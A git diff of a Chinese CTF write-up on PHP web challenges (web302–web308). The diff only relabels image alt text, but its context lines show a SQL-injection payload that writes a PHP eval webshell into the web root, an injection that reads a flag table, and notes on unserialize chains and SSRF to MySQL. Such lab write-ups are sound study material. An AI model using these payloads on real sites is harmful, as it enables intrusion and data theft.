@@ -13,7 +13,7 @@ tags: ["php"]
 
 进来之后就看到一个函数`sds_decode`，但是在这个文件里面都没找到利用这个函数的地方，然后发现sql注入直接写入木马
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
 ```
 POST:
@@ -28,7 +28,7 @@ userid=a'union select '<?php eval(\$_POST[a]);?>'into outfile "/var/www/html/a.p
 
 # web303
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
 一个`insert`注入，但是要登录一下
 
@@ -56,11 +56,11 @@ dpt_name=a',sds_address =(select flag from sds_fl9g)%23
 
 一进来就看到class.php可以写文件
 
-![1](./assets/003.png)
+![image](./assets/003.png)
 
 然后发现注入的时候上防火墙了，不能注入了，然后我们就找`unserialize`，发现在这里
 
-![1](./assets/004.png)
+![image](./assets/004.png)
 
 写个poc
 
@@ -107,13 +107,13 @@ Connection: close
 
 `index.php`发现`unserialize`，`login.php`也有
 
-![1](./assets/005.png)
+![image](./assets/005.png)
 
 然后找链子
 
-![1](./assets/006.png)
+![image](./assets/006.png)
 
-![1](./assets/007.png)
+![image](./assets/007.png)
 
 看懂了吧，写个`poc`
 
@@ -160,17 +160,17 @@ echo base64_encode(serialize($a));
 
 # web307
 
-![1](./assets/008.png)
+![image](./assets/008.png)
 
 拼接命令就可以了，找`unserialize`，发现`login`\\`dptadd`\\`dpt`\\`layout`都有
 
-![1](./assets/009.png)
+![image](./assets/009.png)
 
-![1](./assets/010.png)
+![image](./assets/010.png)
 
 找一下触发点
 
-![1](./assets/011.png)
+![image](./assets/011.png)
 
 所以是两条链子，一个打`service`一个打`dao`
 
@@ -222,11 +222,11 @@ echo base64_encode(serialize($a));
 
 # web308
 
-![1](./assets/012.png)
+![image](./assets/012.png)
 
-![1](./assets/013.png)
+![image](./assets/013.png)
 
-![1](./assets/014.png)
+![image](./assets/014.png)
 
 这里可以打一个`ssrf`，去看看端口开的那个，打`MySQL`
 
